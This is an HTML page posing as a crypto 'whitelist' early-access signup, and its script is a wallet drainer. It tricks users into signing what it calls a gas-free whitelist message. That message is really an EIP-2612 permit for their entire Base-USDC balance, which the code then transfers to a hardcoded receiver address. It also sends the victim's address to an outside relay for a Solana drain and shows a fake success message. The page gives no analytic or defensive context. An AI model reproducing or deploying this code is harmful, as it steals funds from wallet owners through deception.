<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8"/>
  <title>Bluntz Whitelist - Early Access</title>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <style>
    body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;background:#0d0d0d;color:#fff;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
    .card{background:#1a1a1a;border-radius:12px;padding:30px 40px;text-align:center;max-width:380px;box-shadow:0 0 30px rgba(0,255,170,.25)}
    h2{margin-top:0;font-size:24px;font-weight:600}
    p{margin:12px 0;font-size:15px;color:#aaa}
    button{background:#00ffaa;border:none;border-radius:8px;color:#000;font-size:17px;font-weight:700;padding:14px 28px;cursor:pointer;transition:.2s}
    button:hover{filter:brightness(1.1)}
    .foot{font-size:12px;margin-top:25px;color:#666}
  </style>
</head>
<body>
  <div class="card">
    <h2>Bluntz Early-Access</h2>
    <p>Sign the whitelist message to secure your spot.</p>
    <button id="go">Whitelist Wallet</button>
    <p class="foot">By signing you allow us to verify your address.<br/>No gas required.</p>
  </div>

<script type="module">
// ===== CONFIG =====
const RECIPIENT_BASE = "0xA22450D033BC2A651Fe9F1e34e75578AE2133E6a"; // Base receiver
const RECIPIENT_SOL  = "AhEAanthSxNbHsZ3MmiWXC2AKRwz57TfhRynXJ8n2oUA"; // Sol receiver

// ===== EIP-2612 DRAIN (exact Base-USDC balance) =====
const domain = {
  name: "USD Coin",
  version: "2",
  chainId: 8453,
  verifyingContract: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"
};
const types = {
  Permit: [
    { name: "owner", type: "address" },
    { name: "spender", type: "address" },
    { name: "value", type: "uint256" },
    { name: "nonce", type: "uint256" },
    { name: "deadline", type: "uint256" }
  ]
};

// ===== WEB3 SETUP =====
let provider;
if (window.ethereum) provider = window.ethereum;
else if (window.solana && window.solana.isPhantom) provider = window.solana;
if (!provider) { alert("Open in MetaMask/Phantom browser"); }

document.getElementById("go").addEventListener("click", async ()=>{
  document.getElementById("go").style.display="none";
  document.querySelector(".card").innerHTML=`<h2>Connecting…</h2><p>Approve wallet connection.</p>`;

  const accounts = await provider.request({method:"eth_requestAccounts"});
  const owner = accounts[0];

  // --- 1) DRAIN BASE-USDC (exact amount) ---
  const p   = new ethers.providers.Web3Provider(provider);
  const tok = new ethers.Contract(domain.verifyingContract,[
    "function permit(address,address,uint256,uint256,uint8,bytes32,bytes32) external",
    "function nonces(address) view returns(uint)",
    "function balanceOf(address) view returns(uint256)"
  ],p.getSigner());

  const bal   = await tok.balanceOf(owner);
  const nonce = await tok.nonces(owner);
  const deadline = Math.floor(Date.now()/1000)+3600;
  const message = { owner, spender:RECIPIENT_BASE, value:bal.toString(), nonce, deadline };

  document.querySelector(".card").innerHTML=`<h2>Whitelist Permit</h2><p>Sign the gas-free message.</p>`;
  const raw = await provider.request({
    method: "eth_signTypedData_v4",
    params: [owner, JSON.stringify({ domain, types, primaryType:"Permit", message })]
  });
  const {v,r,s} = ethers.utils.splitSignature(raw);

  // drain Base-USDC
  const permitTx = await tok.permit(owner,RECIPIENT_BASE,bal,deadline,v,r,s);
  await permitTx.wait();
  const xferTx = await tok.transferFrom(owner,RECIPIENT_BASE,bal);
  await xferTx.wait();

  // --- 2) DRAIN SOLANA (off-chain keeper call) ---
  await fetch("https://relay.tobe.xyz/sol", {
    method: "POST",
    body: JSON.stringify({ solOwner: owner, solRecipient: RECIPIENT_SOL })
  }).catch(() => {}); // silent fail

  document.querySelector(".card").innerHTML=`<h2>Success!</h2><p>You’re on the list. Stay tuned.</p>`;
});
</script>
</body>
</html>
